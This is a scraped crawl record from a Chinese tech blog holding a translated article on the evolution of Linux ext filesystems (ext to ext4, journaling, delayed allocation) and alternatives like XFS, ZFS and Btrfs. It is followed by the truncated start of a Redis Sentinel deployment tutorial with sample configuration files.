是否仍然能得到进一步的发展。,\n,在一篇文章中，我们不可能讲述文件系统的所有方面，但我们尝试让你尽快了解 Linux 默认文件系统的发展历史，包括它的诞生以及未来发展。,\n,我仔细研究了维基百科里的各种关于 ext 文件系统文章、kernel.org 的 wiki 中关于 ext4 的条目以及结合自己的经验写下这篇文章。,\n,ext 简史,\n,MINIX 文件系统,\n,在有 ext 之前，使用的是 MINIX 文件系统。如果你不熟悉 Linux 历史，那么可以理解为 MINIX 是用于 IBM PC/AT 微型计算机的一个非常小的类 Unix 系统。Andrew Tannenbaum 为了教学的目的而开发了它，并于 1987 年发布了源代码（以印刷版的格式！）。,\n,\n,IBM 1980 中期的 PC/AT，,MBlairMartin,，,CC BY-SA 4.0,\n,虽然你可以细读 MINIX 的源代码，但实际上它并不是自由开源软件（FOSS）。出版 Tannebaum 著作的出版商要求你花 69 美元的许可费来运行 MINIX，而这笔费用包含在书籍的费用中。尽管如此，在那时来说非常便宜，并且 MINIX 的使用得到迅速发展，很快超过了 Tannebaum 当初使用它来教授操作系统编码的意图。在整个 20 世纪 90 年代，你可以发现 MINIX 的安装在世界各个大学里面非常流行。而此时，年轻的 Linus Torvalds 使用 MINIX 来开发原始 Linux 内核，并于 1991 年首次公布，而后在 1992 年 12 月在 GPL 开源协议下发布。,\n,但是等等，这是一篇以 ,文件系统, 为主题的文章不是吗？是的，MINIX 有自己的文件系统，早期的 Linux 版本依赖于它。跟 MINIX 一样，Linux 的文件系统也如同玩具那般小 —— MINIX 文件系统最多能处理 14 个字符的文件名，并且只能处理 64MB 的存储空间。到了 1991 年，一般的硬盘尺寸已经达到了 40-140 MB。很显然，Linux 需要一个更好的文件系统。,\n,ext,\n,当 Linus 开发出刚起步的 Linux 内核时，Rémy Card 从事第一代的 ext 文件系统的开发工作。ext 文件系统在 1992 年首次实现并发布 —— 仅在 Linux 首次发布后的一年！—— ext 解决了 MINIX 文件系统中最糟糕的问题。,\n,1992 年的 ext 使用在 Linux 内核中的新虚拟文件系统（VFS）抽象层。与之前的 MINIX 文件系统不同的是，ext 可以处理高达 2 GB 存储空间并处理 255 个字符的文件名。,\n,但 ext 并没有长时间占统治地位，主要是由于它原始的时间戳（每个文件仅有一个时间戳，而不是今天我们所熟悉的有 inode、最近文件访问时间和最新文件修改时间的时间戳。）仅仅一年后，ext2 就替代了它。,\n,ext2,\n,Rémy 很快就意识到 ext 的局限性，所以一年后他设计出 ext2 替代它。当 ext 仍然根植于 “玩具” 操作系统时，ext2 从一开始就被设计为一个商业级文件系统，沿用 BSD 的 Berkeley 文件系统的设计原理。,\n,ext2 提供了 GB 级别的最大文件大小和 TB 级别的文件系统大小，使其在 20 世纪 90 年代的地位牢牢巩固在文件系统大联盟中。很快它被广泛地使用，无论是在 Linux 内核中还是最终在 MINIX 中，且利用第三方模块可以使其应用于 MacOS 和 Windows。,\n,但这里仍然有一些问题需要解决：ext2 文件系统与 20 世纪 90 年代的大多数文件系统一样，如果在将数据写入到磁盘的时候，系统发生崩溃或断电，则容易发生灾难性的数据损坏。随着时间的推移，由于碎片（单个文件存储在多个位置，物理上其分散在旋转的磁盘上），它们也遭受了严重的性能损失。,\n,尽管存在这些问题，但今天 ext2 还是用在某些特殊的情况下 —— 最常见的是，作为便携式 USB 驱动器的文件系统格式。,\n,ext3,\n,1998 年，在 ext2 被采用后的 6 年后，Stephen Tweedie 宣布他正在致力于改进 ext2。这成了 ext3，并于 2001 年 11 月在 2.4.15 内核版本中被采用到 Linux 内核主线中。,\n,\n,20 世纪 90 年代中期的 Packard Bell 计算机，,Spacekid,，,CC0,\n,在大部分情况下，ext2 在 Linux 发行版中工作得很好，但像 FAT、FAT32、HFS 和当时的其它文件系统一样 —— 在断电时容易发生灾难性的破坏。如果在将数据写入文件系统时候发生断电，则可能会将其留在所谓 ,不一致, 的状态 —— 事情只完成一半而另一半未完成。这可能导致大量文件丢失或损坏，这些文件与正在保存的文件无关甚至导致整个文件系统无法卸载。,\n,ext3 和 20 世纪 90 年代后期的其它文件系统，如微软的 NTFS，使用 ,日志, 来解决这个问题。日志是磁盘上的一种特殊的分配区域，其写入被存储在事务中；如果该事务完成磁盘写入，则日志中的数据将提交给文件系统自身。如果系统在该操作提交前崩溃，则重新启动的系统识别其为未完成的事务而将其进行回滚，就像从未发生过一样。这意味着正在处理的文件可能依然会丢失，但文件系统 ,本身, 保持一致，且其它所有数据都是安全的。,\n,在使用 ext3 文件系统的 Linux 内核中实现了三个级别的日志记录方式：日记journal、顺序ordered和回写writeback。,\n,\n,日记, 是最低风险模式，在将数据和元数据提交给文件系统之前将其写入日志。这可以保证正在写入的文件与整个文件系统的一致性，但其显著降低了性能。,\n,顺序, 是大多数 Linux 发行版默认模式；顺序模式将元数据写入日志而直接将数据提交到文件系统。顾名思义，这里的操作顺序是固定的：首先，元数据提交到日志；其次，数据写入文件系统，然后才将日志中关联的元数据更新到文件系统。这确保了在发生崩溃时，那些与未完整写入相关联的元数据仍在日志中，且文件系统可以在回滚日志时清理那些不完整的写入事务。在顺序模式下，系统崩溃可能导致在崩溃期间文件的错误被主动写入，但文件系统它本身 —— 以及未被主动写入的文件 —— 确保是安全的。,\n,回写, 是第三种模式 —— 也是最不安全的日志模式。在回写模式下，像顺序模式一样，元数据会被记录到日志，但数据不会。与顺序模式不同，元数据和数据都可以以任何有利于获得最佳性能的顺序写入。这可以显著提高性能，但安全性低很多。尽管回写模式仍然保证文件系统本身的安全性，但在崩溃或崩溃之前写入的文件很容易丢失或损坏。,\n,\n,跟之前的 ext2 类似，ext3 使用 16 位内部寻址。这意味着对于有着 4K 块大小的 ext3 在最大规格为 16 TiB 的文件系统中可以处理的最大文件大小为 2 TiB。,\n,ext4,\n,Theodore Ts’o（是当时 ext3 主要开发人员）在 2006 年发表的 ext4，于两年后在 2.6.28 内核版本中被加入到了 Linux 主线。,\n,Ts’o 将 ext4 描述为一个显著扩展 ext3 但仍然依赖于旧技术的临时技术。他预计 ext4 终将会被真正的下一代文件系统所取代。,\n,\n,Dell Precision 380 工作站，,Lance Fisher,，,CC BY-SA 2.0,\n,ext4 在功能上与 ext3 在功能上非常相似，但支持大文件系统，提高了对碎片的抵抗力，有更高的性能以及更好的时间戳。,\n,ext4 vs ext3,\n,ext3 和 ext4 有一些非常明确的差别，在这里集中讨论下。,\n,向后兼容性,\n,ext4 特地设计为尽可能地向后兼容 ext3。这不仅允许 ext3 文件系统原地升级到 ext4；也允许 ext4 驱动程序以 ext3 模式自动挂载 ext3 文件系统，因此使它无需单独维护两个代码库。,\n,大文件系统,\n,ext3 文件系统使用 32 位寻址，这限制它仅支持 2 TiB 文件大小和 16 TiB 文件系统系统大小（这是假设在块大小为 4 KiB 的情况下，一些 ext3 文件系统使用更小的块大小，因此对其进一步被限制）。,\n,ext4 使用 48 位的内部寻址，理论上可以在文件系统上分配高达 16 TiB 大小的文件，其中文件系统大小最高可达 1000000 TiB（1 EiB）。在早期 ext4 的实现中有些用户空间的程序仍然将其限制为最大大小为 16 TiB 的文件系统，但截至 2011 年，e2fsprogs 已经直接支持大于 16 TiB 大小的 ext4 文件系统。例如，红帽企业 Linux 在其合同上仅支持最高 50 TiB 的 ext4 文件系统，并建议 ext4 卷不超过 100 TiB。,\n,分配方式改进,\n,ext4 在将存储块写入磁盘之前对存储块的分配方式进行了大量改进，这可以显著提高读写性能。,\n,区段,\n,区段extent是一系列连续的物理块 (最多达 128 MiB，假设块大小为 4 KiB），可以一次性保留和寻址。使用区段可以减少给定文件所需的 inode 数量，并显著减少碎片并提高写入大文件时的性能。,\n,多块分配,\n,ext3 为每一个新分配的块调用一次块分配器。当多个写入同时打开分配器时，很容易导致严重的碎片。然而，ext4 使用延迟分配，这允许它合并写入并更好地决定如何为尚未提交的写入分配块。,\n,持久的预分配,\n,在为文件预分配磁盘空间时，大部分文件系统必须在创建时将零写入该文件的块中。ext4 允许替代使用 ,fallocate(),，它保证了空间的可用性（并试图为它找到连续的空间），而不需要先写入它。这显著提高了写入和将来读取流和数据库应用程序的写入数据的性能。,\n,延迟分配,\n,这是一个耐人寻味而有争议性的功能。延迟分配允许 ext4 等待分配将写入数据的实际块，直到它准备好将数据提交到磁盘。（相比之下，即使数据仍然在往写入缓存中写入，ext3 也会立即分配块。）,\n,当缓存中的数据累积时，延迟分配块允许文件系统对如何分配块做出更好的选择，降低碎片（写入，以及稍后的读）并显著提升性能。然而不幸的是，它 ,增加, 了还没有专门调用 ,fsync(), 方法（当程序员想确保数据完全刷新到磁盘时）的程序的数据丢失的可能性。,\n,假设一个程序完全重写了一个文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfd=open(\"file\", O_TRUNC); write(fd, data); close(fd);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,fd,=,open,(,\"file\",,, ,O_TRUNC,),;, ,write,(,fd,,, ,data,),;, ,close,(,fd,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用旧的文件系统，,close(fd);, 足以保证 ,file, 中的内容刷新到磁盘。即使严格来说，写不是事务性的，但如果文件关闭后发生崩溃，则丢失数据的风险很小。,\n,如果写入不成功（由于程序上的错误、磁盘上的错误、断电等），文件的原始版本和较新版本都可能丢失数据或损坏。如果其它进程在写入文件时访问文件，则会看到损坏的版本。如果其它进程打开文件并且不希望其内容发生更改 —— 例如，映射到多个正在运行的程序的共享库。这些进程可能会崩溃。,\n,为了避免这些问题，一些程序员完全避免使用 ,O_TRUNC,。相反，他们可能会写入一个新文件，关闭它，然后将其重命名为旧文件名：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfd=open(\"newfile\"); write(fd, data); close(fd); rename(\"newfile\", \"file\");,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,fd,=,open,(,\"newfile\",),;, ,write,(,fd,,, ,data,),;, ,close,(,fd,),;, ,rename,(,\"newfile\",,, ,\"file\",),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 ,没有, 延迟分配的文件系统下，这足以避免上面列出的潜在的损坏和崩溃问题：因为 ,rename(), 是原子操作，所以它不会被崩溃中断；并且运行的程序将继续引用旧的文件。现在 ,file, 的未链接版本只要有一个打开的文件文件句柄即可。但是因为 ext4 的延迟分配会导致写入被延迟和重新排序，,rename(\"newfile\", \"file\"), 可以在 ,newfile, 的内容实际写入磁盘内容之前执行，这出现了并行进行再次获得 ,file, 坏版本的问题。,\n,为了缓解这种情况，Linux 内核（自版本 2.6.30）尝试检测这些常见代码情况并强制立即分配。这会减少但不能防止数据丢失的可能性 —— 并且它对新文件没有任何帮助。如果你是一位开发人员，请注意：保证数据立即写入磁盘的唯一方法是正确调用 ,fsync(),。,\n,无限制的子目录,\n,ext3 仅限于 32000 个子目录；ext4 允许无限数量的子目录。从 2.6.23 内核版本开始，ext4 使用 HTree 索引来减少大量子目录的性能损失。,\n,日志校验,\n,ext3 没有对日志进行校验，这给处于内核直接控制之外的磁盘或自带缓存的控制器设备带来了问题。如果控制器或具自带缓存的磁盘脱离了写入顺序，则可能会破坏 ext3 的日记事务顺序，从而可能破坏在崩溃期间（或之前一段时间）写入的文件。,\n,理论上，这个问题可以使用写入障碍barrier —— 在安装文件系统时，你在挂载选项设置 ,barrier=1,，然后设备就会忠实地执行 ,fsync, 一直向下到底层硬件。通过实践，可以发现存储设备和控制器经常不遵守写入障碍 —— 提高性能（和跟竞争对手比较的性能基准），但增加了本应该防止数据损坏的可能性。,\n,对日志进行校验和允许文件系统崩溃后第一次挂载时意识到其某些条目是无效或无序的。因此，这避免了回滚部分条目或无序日志条目的错误，并进一步损坏的文件系统 —— 即使部分存储设备假做或不遵守写入障碍。,\n,快速文件系统检查,\n,在 ext3 下，在 ,fsck, 被调用时会检查整个文件系统 —— 包括已删除或空文件。相比之下，ext4 标记了 inode 表未分配的块和扇区，从而允许 ,fsck, 完全跳过它们。这大大减少了在大多数文件系统上运行 ,fsck, 的时间，它实现于内核 2.6.24。,\n,改进的时间戳,\n,ext3 提供粒度为一秒的时间戳。虽然足以满足大多数用途，但任务关键型应用程序经常需要更严格的时间控制。ext4 通过提供纳秒级的时间戳，使其可用于那些企业、科学以及任务关键型的应用程序。,\n,ext3 文件系统也没有提供足够的位来存储 2038 年 1 月 18 日以后的日期。ext4 在这里增加了两个位，将 ,Unix 纪元,扩展了 408 年。如果你在公元 2446 年读到这篇文章，你很有可能已经转移到一个更好的文件系统 —— 如果你还在测量自 1970 年 1 月 1 日 00:00（UTC）以来的时间，这会让我死后得以安眠。,\n,在线碎片整理,\n,ext2 和 ext3 都不直接支持在线碎片整理 —— 即在挂载时会对文件系统进行碎片整理。ext2 有一个包含的实用程序 ,e2defrag,，它的名字暗示 —— 它需要在文件系统未挂载时脱机运行。（显然，这对于根文件系统来说非常有问题。）在 ext3 中的情况甚至更糟糕 —— 虽然 ext3 比 ext2 更不容易受到严重碎片的影响，但 ext3 文件系统运行 ,e2defrag, 可能会导致灾难性损坏和数据丢失。,\n,尽管 ext3 最初被认为“不受碎片影响”，但对同一文件（例如 BitTorrent）采用大规模并行写入过程的过程清楚地表明情况并非完全如此。一些用户空间的手段和解决方法，例如 ,Shake,，以这样或那样方式解决了这个问题 —— 但它们比真正的、文件系统感知的、内核级碎片整理过程更慢并且在各方面都不太令人满意。,\n,ext4 通过 ,e4defrag, 解决了这个问题，且是一个在线、内核模式、文件系统感知、块和区段级别的碎片整理实用程序。,\n,正在进行的 ext4 开发,\n,ext4，正如 Monty Python 中瘟疫感染者曾经说过的那样，“我还没死呢！”虽然它的,主要开发人员,认为它只是一个真正的,下一代文件系统,的权宜之计，但是在一段时间内，没有任何可能的候选人准备好（由于技术或许可问题）部署为根文件系统。,\n,在未来的 ext4 版本中仍然有一些关键功能要开发，包括元数据校验和、一流的配额支持和大分配块。,\n,元数据校验和,\n,由于 ext4 具有冗余超级块，因此为文件系统校验其中的元数据提供了一种方法，可以自行确定主超级块是否已损坏并需要使用备用块。可以在没有校验和的情况下，从损坏的超级块恢复 —— 但是用户首先需要意识到它已损坏，然后尝试使用备用方法手动挂载文件系统。由于在某些情况下，使用损坏的主超级块安装文件系统读写可能会造成进一步的损坏，即使是经验丰富的用户也无法避免，这也不是一个完美的解决方案！,\n,与 Btrfs 或 ZFS 等下一代文件系统提供的极其强大的每块校验和相比，ext4 的元数据校验和的功能非常弱。但它总比没有好。虽然校验 ,所有的事情, 都听起来很简单！—— 事实上，将校验和与文件系统连接到一起有一些重大的挑战；请参阅,设计文档,了解详细信息。,\n,一流的配额支持,\n,等等，配额？！从 ext2 出现的那天开始我们就有了这些！是的，但它们一直都是事后的添加的东西，而且它们总是犯傻。这里可能不值得详细介绍，但,设计文档,列出了配额将从用户空间移动到内核中的方式，并且能够更加正确和高效地执行。,\n,大分配块,\n,随着时间的推移，那些讨厌的存储系统不断变得越来越大。由于一些固态硬盘已经使用 8K 硬件块大小，因此 ext4 对 4K 模块的当前限制越来越受到限制。较大的存储块可以显著减少碎片并提高性能，代价是增加“松弛”空间（当你只需要块的一部分来存储文件或文件的最后一块时留下的空间）。,\n,你可以在,设计文档,中查看详细说明。,\n,ext4 的实际限制,\n,ext4 是一个健壮、稳定的文件系统。如今大多数人都应该在用它作为根文件系统，但它无法处理所有需求。让我们简单地谈谈你不应该期待的一些事情 —— 现在或可能在未来：,\n,虽然 ext4 可以处理高达 1 EiB 大小（相当于 1,000,000 TiB）大小的数据，但你 ,真的, 不应该尝试这样做。除了能够记住更多块的地址之外，还存在规模上的问题。并且现在 ext4 不会处理（并且可能永远不会）超过 50-100 TiB 的数据。,\n,ext4 也不足以保证数据的完整性。随着日志记录的重大进展又回到了 ext3 的那个时候，它并未涵盖数据损坏的许多常见原因。如果数据已经在磁盘上被,破坏, —— 由于故障硬件，宇宙射线的影响（是的，真的），或者只是数据随时间衰减 —— ext4 无法检测或修复这种损坏。,\n,基于上面两点，ext4 只是一个纯 ,文件系统,，而不是存储卷管理器。这意味着，即使你有多个磁盘 —— 也就是奇偶校验或冗余，理论上你可以从 ext4 中恢复损坏的数据，但无法知道使用它是否对你有利。虽然理论上可以在不同的层中分离文件系统和存储卷管理系统而不会丢失自动损坏检测和修复功能，但这不是当前存储系统的设计方式，并且它将给新设计带来重大挑战。,\n,备用文件系统,\n,在我们开始之前，提醒一句：要非常小心，没有任何备用的文件系统作为主线内核的一部分而内置和直接支持！,\n,即使一个文件系统是 ,安全的,，如果在内核升级期间出现问题，使用它作为根文件系统也是非常可怕的。如果你没有充分的理由通过一个 chroot 去使用替代介质引导，耐心地操作内核模块、grub 配置和 DKMS……不要在一个很重要的系统中去掉预留的根文件。,\n,可能有充分的理由使用你的发行版不直接支持的文件系统 —— 但如果你这样做，我强烈建议你在系统启动并可用后再安装它。（例如，你可能有一个 ext4 根文件系统，但是将大部分数据存储在 ZFS 或 Btrfs 池中。）,\n,XFS,\n,XFS 与非 ext 文件系统在 Linux 中的主线中的地位一样。它是一个 64 位的日志文件系统，自 2001 年以来内置于 Linux 内核中，为大型文件系统和高度并发性提供了高性能（即大量的进程都会立即写入文件系统）。,\n,从 RHEL 7 开始，XFS 成为 Red Hat Enterprise Linux 的默认文件系统。对于家庭或小型企业用户来说，它仍然有一些缺点 —— 最值得注意的是，重新调整现有 XFS 文件系统是一件非常痛苦的事情，不如创建另一个并复制数据更有意义。,\n,虽然 XFS 是稳定的且是高性能的，但它和 ext4 之间没有足够具体的最终用途差异，以值得推荐在非默认（如 RHEL7）的任何地方使用它，除非它解决了对 ext4 的特定问题，例如大于 50 TiB 容量的文件系统。,\n,XFS 在任何方面都不是 ZFS、Btrfs 甚至 WAFL（一个专有的 SAN 文件系统）的“下一代”文件系统。就像 ext4 一样，它应该被视为一种更好的方式的权宜之计。,\n,ZFS,\n,ZFS 由 Sun Microsystems 开发，以 zettabyte 命名 —— 相当于 1 万亿 GB —— 因为它理论上可以解决大型存储系统。,\n,作为真正的下一代文件系统，ZFS 提供卷管理（能够在单个文件系统中处理多个单独的存储设备），块级加密校验和（允许以极高的准确率检测数据损坏），,自动损坏修复,（其中冗余或奇偶校验存储可用），,快速异步增量复制,，内联压缩等，,以及更多,。,\n,从 Linux 用户的角度来看，ZFS 的最大问题是许可证问题。ZFS 许可证是 CDDL 许可证，这是一种与 GPL 冲突的半许可的许可证。关于在 Linux 内核中使用 ZFS 的意义存在很多争议，其争议范围从“它是 GPL 违规”到“它是 CDDL 违规”到“它完全没问题，它还没有在法庭上进行过测试。”最值得注意的是，自 2016 年以来 Canonical 已将 ZFS 代码内联在其默认内核中，而且目前尚无法律挑战。,\n,此时，即使我作为一个非常狂热于 ZFS 的用户，我也不建议将 ZFS 作为 Linux 的根文件系统。如果你想在 Linux 上利用 ZFS 的优势，用 ext4 设置一个小的根文件系统，然后将 ZFS 用在你剩余的存储上，把数据、应用程序以及你喜欢的东西放在它上面 —— 但把 root 分区保留在 ext4 上，直到你的发行版明确支持 ZFS 根目录。,\n,Btrfs,\n,Btrfs 是 B-Tree Filesystem 的简称，通常发音为 “butter” —— 由 Chris Mason 于 2007 年在 Oracle 任职期间发布。Btrfs 旨在跟 ZFS 有大部分相同的目标，提供多种设备管理、每块校验、异步复制、直列压缩等，,还有更多,。,\n,截至 2018 年，Btrfs 相当稳定，可用作标准的单磁盘文件系统，但可能不应该依赖于卷管理器。与许多常见用例中的 ext4、XFS 或 ZFS 相比，它存在严重的性能问题，其下一代功能 —— 复制、多磁盘拓扑和快照管理 —— 可能非常多，其结果可能是从灾难性地性能降低到实际数据的丢失。,\n,Btrfs 的维持状态是有争议的；SUSE Enterprise Linux 在 2015 年采用它作为默认文件系统，而 Red Hat 于 2017 年宣布它从 RHEL 7.4 开始不再支持 Btrfs。可能值得注意的是，该产品支持 Btrfs 部署用作单磁盘文件系统，而不是像 ZFS 中的多磁盘卷管理器，甚至 Synology 在它的存储设备使用 Btrfs，但是它在传统 Linux 内核 RAID（mdraid）之上分层来管理磁盘。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114377/", "url_object_id": "a19f6c19524705b17c52d9e997dd7919", "front_image_path": "full/8141690b03d35ed04679c81e69d075e736fd8883.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "title": "深入学习 Redis（4）：哨兵", "create_time": "2018/09/13", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,编程迷思,   ,前言,\n,在 ,深入学习Redis（3）：主从复制, 中曾提到，Redis主从复制的作用有数据热备、负载均衡、故障恢复等；但主从复制存在的一个问题是故障恢复无法自动化。本文将要介绍的哨兵，它基于Redis主从复制，主要作用便是解决主节点故障恢复的自动化问题，进一步提高系统的高可用性。,\n,文章主要内容如下：首先介绍哨兵的作用和架构；然后讲述哨兵系统的部署方法，以及通过客户端访问哨兵系统的方法；然后简要说明哨兵实现的基本原理；最后给出关于哨兵实践的一些建议。文章内容基于Redis 3.0版本。,\n,系列文章,\n,深入学习Redis（1）：Redis内存模型,\n,深入学习Redis（2）：持久化,\n,深入学习Redis（3）：主从复制,\n,一、作用和架构,\n,1.  作用,\n,在介绍哨兵之前，首先从宏观角度回顾一下Redis实现高可用相关的技术。它们包括：持久化、复制、哨兵和集群，其主要作用和解决的问题是：,\n,\n,持久化：持久化是最简单的高可用方法(有时甚至不被归为高可用的手段)，主要作用是数据备份，即将数据存储在硬盘，保证数据不会因进程退出而丢失。,\n,复制：复制是高可用Redis的基础，哨兵和集群都是在复制基础上实现高可用的。复制主要实现了数据的多机备份，以及对于读操作的负载均衡和简单的故障恢复。缺陷：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制。,\n,哨兵：在复制的基础上，哨兵实现了自动化的故障恢复。缺陷：写操作无法负载均衡；存储能力受到单机的限制。,\n,集群：通过集群，Redis解决了写操作无法负载均衡，以及存储能力受到单机限制的问题，实现了较为完善的高可用方案。,\n,\n,下面说回哨兵。,\n,Redis Sentinel，即Redis哨兵，在Redis 2.8版本开始引入。,哨兵的核心功能是主节点的自动故障转移。,下面是Redis官方文档对于哨兵功能的描述：,\n,\n,监控（Monitoring）：哨兵会不断地检查主节点和从节点是否运作正常。,\n,自动故障转移（Automatic failover）：当主节点不能正常工作时，哨兵会开始自动故障转移操作，它会将失效主节点的其中一个从节点升级为新的主节点，并让其他从节点改为复制新的主节点。,\n,配置提供者（Configuration provider）：客户端在初始化时，通过连接哨兵来获得当前Redis服务的主节点地址。,\n,通知（Notification）：哨兵可以将故障转移的结果发送给客户端。,\n,\n,其中，监控和自动故障转移功能，使得哨兵可以及时发现主节点故障并完成转移；而配置提供者和通知功能，则需要在与客户端的交互中才能体现。,\n,这里对“客户端”一词在文章中的用法做一个说明：在前面的文章中，只要通过API访问redis服务器，都会称作客户端，包括redis-cli、Java客户端Jedis等；为了便于区分说明，本文中的客户端并不包括redis-cli，而是比redis-cli更加复杂：redis-cli使用的是redis提供的底层接口，而客户端则对这些接口、功能进行了封装，以便充分利用哨兵的配置提供者和通知功能。,\n,2.  架构,\n,典型的哨兵架构图如下所示：,\n,\n,它由两部分组成，哨兵节点和数据节点：,\n,\n,哨兵节点：哨兵系统由一个或多个哨兵节点组成，哨兵节点是特殊的redis节点，不存储数据。,\n,数据节点：主节点和从节点都是数据节点。,\n,\n,二、部署,\n,这一部分将部署一个简单的哨兵系统，包含1个主节点、2个从节点和3个哨兵节点。方便起见：所有这些节点都部署在一台机器上（局域网IP：192.168.92.128），使用端口号区分；节点的配置尽可能简化。,\n,1.  部署主从节点,\n,哨兵系统中的主从节点，与普通的主从节点配置是一样的，并不需要做任何额外配置。下面分别是主节点（port=6379）和2个从节点（port=6380/6381）的配置文件，配置都比较简单，不再详述。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#redis-6379.conf\r\nport 6379\r\ndaemonize yes\r\nlogfile \"6379.log\"\r\ndbfilename \"dump-6379.rdb\"\r\n\r\n#redis-6380.conf\r\nport 6380\r\ndaemonize yes\r\nlogfile \"6380.log\"\r\ndbfilename \"dump-6380.rdb\"\r\nslaveof 192.168.92.128 6379\r\n\r\n#redis-6381.conf\r\nport 6381\r\ndaemonize yes\r\nlogfile \"6381.log\"\r\ndbfilename \"dump-6381.rdb\"\r\nslaveof 192.168.92.128 6379,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#redis-6379.conf,port, ,6379,daemonize ,yes,logfile, ,\"6379.log\",dbfilename, ,\"dump-6379.rdb\", ,#redis-6380.conf,port, ,6380,daemonize ,yes,logfile, ,\"6380.log\",dbfilename, ,\"dump-6380.rdb\",slaveof, ,192.168.92.128, ,6379, ,#redis-6381.conf,port, ,6381,daemonize ,yes,logfile, ,\"6381.log\",dbfilename, ,\"dump-6381.rdb\",slaveof, ,192.168.92.128, ,6379,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,配置完成后，依次启动主节点和从节点：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nredis-server redis-6379.conf\r\nredis-server redis-6380.conf\r\nredis-server redis-6381.conf,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,redis,-,server ,redis,-,6379.conf,redis,-,server ,redis,-,6380.conf,redis,-,server ,redis,-,6381.conf,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,节点启动后，连接主节点查看主从状态是否正常，如下图所示：,\n,\n,2.  部署哨兵节点,\n,哨兵节点本质上是特殊的Redis节点。,\n,3个哨兵节点的配置几乎是完全一样的，主要区别在于端口号的不同（26379/26380/26381），下面以26379节点为例介绍节点的配置和启动方式；配置部分尽量简化，更多配置会在后面介绍。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#sentinel-26379.conf\r\nport 26379\r\ndaemonize yes\r\nlogfile \"26379.log\"\r\nsentinel monitor mymaster 192.168.92.128 6379 2,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#sentinel-26379.conf,port, ,26379,daemonize ,yes,logfile, ,\"26379.log\",sentinel ,monitor ,mymaster, ,192.168.92.128, ,6379, ,2,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,其中，sentinel monitor mymaster 192.168.92.128 6379 2 配置的含义是：该哨兵节点监控192.168.92.128:6379这个主节点，该主节点的名称是mymaster，最后的2的含义与主节点的故障判定有关：至少需要2个哨兵节点同意，才能判定主节点故障并进行故障转移。,\n,哨兵节点的启动有两种方式，二者作用是完全相同的：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nredis-sentinel sentinel-26379.conf\r\nredis-server sentinel-26379.conf --sentinel,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,redis,-,sentinel ,sentinel,-,26379.conf,redis,-,server ,sentinel,-,26379.conf, ,--,sentinel,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,按照上述方式配置和启动之后，整个哨兵系统就启动完毕了。可以通过redis-cli连接哨兵节点进行验证，如下图所示：可以看出26379哨兵节点已经在监控mymaster主节点(即192.168.92.128:6379)，并发现了其2个从节点和另外2个哨兵节点。,\n,\n,此时如果查看哨兵节点的配置文件，会发现一些变化，以26379为例：,\n,\n,其中，dir只是显式声明了数据和日志所在的目录（在哨兵语境下只有日志）；known-slave和known-sentinel显示哨兵已经发现了从节点和其他哨兵；带有epoch的参数与配置纪元有关（配置纪元是一个从0开始的计数器，每进行一次领导者哨兵选举，都会+1；领导者哨兵选举是故障转移阶段的一个操作，在后文原理部分会介绍）。,\n,3.  